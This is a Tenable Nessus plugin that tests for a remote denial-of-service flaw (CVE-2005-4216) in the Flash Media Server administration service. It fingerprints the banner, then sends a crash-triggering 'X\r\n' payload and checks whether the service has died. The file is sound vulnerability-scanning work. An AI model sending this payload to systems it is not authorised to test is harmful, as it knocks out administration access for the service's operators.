#
# (C) Tenable Network Security
#

include("compat.inc");

if (description) {
  script_id(20302);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2005-4216");
  script_bugtraq_id(15822);
  script_xref(name:"OSVDB", value:"21764");
 
  script_name(english:"Macromedia Flash Media Server Administration Service Crafted Packet Remote DoS");
  script_summary(english:"Checks for denial of service vulnerability in Flash Media Server Administration Service");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote service is prone to a remote denial of service attack." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be using Flash Media Server.

The version of Flash Media Server installed on the remote host
is affected by a flaw in its administration server that causes it to crash
if it receives a single character. The administration server 
is used to remotely administer Flash Media Server, and this flaw
can be used by an attacker to disable access to this service." );
 script_set_attribute(attribute:"solution", value:
"Limit access to this port to trusted users." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C" );
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");
 
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl");
  script_require_ports("Services/www", 1111);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:1111);

# If it looks like FMS Administration Server...
banner = get_http_banner(port:port);
if ("Server: FlashCom/" >!< banner) exit(0, "Not a FlashCom web server");

# nb: the advisory is wrong about a single character;
#     it ignores the effect of the line endings.
w = http_send_recv_buf(port:port, data: 'X\r\n');

# There's a problem if the server's down now.
if (http_is_dead(port:port)) security_hole(port);
